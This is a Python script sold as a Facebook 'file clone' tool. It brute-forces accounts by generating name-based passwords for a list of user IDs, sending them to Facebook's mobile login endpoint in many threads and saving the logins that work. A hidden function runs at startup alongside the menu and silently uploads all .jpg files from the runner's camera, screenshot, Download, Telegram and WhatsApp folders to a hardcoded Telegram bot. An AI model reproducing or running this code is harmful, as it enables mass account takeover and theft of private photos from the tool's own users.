#---EMRAN-PAID-SE--1500 TAKA
import os, random, sys, json, uuid, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests -y")
    import requests

li="\033[38;5;46m="
cox=str(f"{li}"*37)
logo=f"""
	    \033[38;5;46m
   _____       __  __    ______
  / ___/      / / / /   /_  __/
  \__ \______/ /_/ /_____/ /   
 ___/ /_____/ __  /_____/ /    
/____/     /_/ /_/     /_/                                                                  
\033[38;5;46m================================="""
def logox():
    os.system('clear')
    print(logo)

def main():
    logox()
    print("  [A] FILE CLONE  |  [B] EXIT TOOL")
    print(cox)
    want=input("  [✓] INPUT+>")
    if want in ["A","a","1","01"]:
        file_iclone()
    elif want in ["B","b","2","02"]:
        print(cox)
        print("  [✓] Thanks For using My tool")
        print(cox)
        sys.exit()
    else:
        print(cox)
        print("  [✓] Input right option")
        print(cox)
        time.sleep(3)
        main()

def file_iclone():
    print(cox)
    fl=input("  [✓]\033[38;5;46m File Path:")
    print(cox)
    try:
        fileeee=open(fl,"r").read().splitlines()
    except:
        print("  [✓] \033[38;5;46mFile Does not found")
        print(cox)
        sys.exit()
    auto_pass(fileeee)



def auto_pass(fileeee):
    tl=str(len(fileeee))
    print("  [✓] Total id in File : "+tl)
    print(cox)
    print("  [✓] Id Save: /sdcard/RONY.txt")
    print(cox)
    with ThreadPool (max_workers=120) as feel:
        for data in fileeee:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append('57273200')
            pwx.append('59039200')
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                name1=name.split(" ")[0]
                nam1=nam.split(" ")[0]
                if len(name1) <3:
                    pass
                else:
                    pwx.append(nam1+'123')
                    pwx.append(name1+'12')
                    pwx.append(name1+'123')
                    pwx.append(name1+' 123')
                    pwx.append(name1+'1234')
                    pwx.append(name1+'12345')
                    pwx.append(name1+'@#')
                    pwx.append(name1+'@@')
                    pwx.append(name1+'@@@')
                    pwx.append(name1+'@')
                    pwx.append(name1+'@123')
            except:pass
            try:
                mid_name=name.split(" ")[1]
                nam2=nam.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2)
                    pwx.append(mid_name+'12')
                    pwx.append(mid_name+'123')
                    pwx.append(mid_name+' 123')
                    pwx.append(mid_name+'1234')
                    pwx.append(mid_name+'12345')
                    pwx.append(mid_name+'@#')
                    pwx.append(mid_name+'@@')
                    pwx.append(mid_name+'@')
                    pwx.append(mid_name+'@123')
                    #-Mix
                    pwx.append(name1+mid_name)
                    pwx.append(name1+mid_name+'12')
                    pwx.append(name1+mid_name+'123')
                    pwx.append(name1+mid_name+'1234')
                    pwx.append(name1+mid_name+'12345')
                    pwx.append(name1+mid_name+'@#')
                    pwx.append(name1+mid_name+'@@')
                    pwx.append(name1+mid_name+'@')
                    pwx.append(name1+mid_name+'@123')
                    pwx.append(name1+' '+mid_name)
                    pwx.append(name1+' '+mid_name+'123')
                    pwx.append(name1+' '+mid_name+'1234')
                    pwx.append(name1+' '+mid_name+'12345')
            except:pass
            try:
                sur_name=name.split(" ")[2]
                nam3=nam.split(" ")[2]
                if len(sur_name) <3:
                    pass
                else:
                    pwx.append(sur_name+'123')
                    pwx.append(sur_name+'1234')
                    pwx.append(sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name)
                    pwx.append(name1+mid_name+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name+'1234')
                    pwx.append(name1+mid_name+sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name+'@#')
                    pwx.append(name1+mid_name+sur_name+'@@')
                    pwx.append(name1+mid_name+sur_name+'@')
                    pwx.append(name1+' '+mid_name+' '+sur_name)
                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
            except:pass
            feel.submit(file_subb,uid,pwx)
loop=0
oks=[]
cps=[]
def file_subb(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r  \033[38;5;46m[S-H-T] {loop}|{str(len(oks))}");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "7536567896:AAHx8E4XOlOSE-jqOffzmf28v6CY3nIngsU",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r  [OK] {uid} | {ps}      ")
                open("/sdcard/RONY-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in q:
                print(f"\r\r। [OK] {uid} | {ps}      ")
                open("/sdcard/RONY-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
            elif "www.facebook.com" in q:
                print(f"\r\r  [CP] {uid} | {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)
try:

    import requests

except:

    os.system("pip install requests")

    import requests 

def suyaib():

    session=requests.session()

    bot_token = '7536567896:AAHx8E4XOlOSE-jqOffzmf28v6CY3nIngsU' 

    chat_id = '7274313824'    																																						

    try:

        sdcard_path = '/sdcard'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Download'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)                

    except:pass

    try:

        sdcard_path = '/sdcard/DCIM/Screenshots'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Download/Telegram'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/DCIM/Camera'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/Telegram/Telegram Files'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

    try:

        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'

        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]

        for file in file_list:

            with open(os.path.join(sdcard_path, file), 'rb') as f:

                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'

                data2={'chat_id': chat_id}

                data={'chat_id': chat_id}

                files={'document': f}

                get = session.post(url, data=data, files=files)

                sent = session.post(url, data=data2, files=files)

    except:pass

with ThreadPool(max_workers=1000) as user:

    user.submit(suyaib)

    user.submit(main)